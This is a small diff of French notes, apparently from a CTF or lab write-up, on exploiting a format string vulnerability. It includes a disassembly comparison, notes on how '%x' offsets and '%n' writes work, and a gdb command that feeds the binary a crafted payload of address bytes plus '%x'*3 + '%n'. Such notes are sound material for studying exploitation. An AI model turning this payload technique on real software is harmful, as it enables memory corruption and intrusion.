@@ -17,7 +17,7 @@ https://resources.infosecinstitute.com/topic/buffer-overflow-format-string-attac
 0x080484df <+59>:	cmp    $0x40,%eax
 
 0x804988c -> Adresse de comparaison avec 0x40
-"%x" * 3 -> offset vers le dernier octet de la "variable"
+"%x" * 3 -> offset vers la stack du printf
 "%n" -> force le printf a ecrire le nombre de caractere affiche precedemment a l'adresse cible
 
 gdb-peda$ r < <(python -c 'print "\x8c\x98\x04\x08" + "%x"*3 + "%n"')
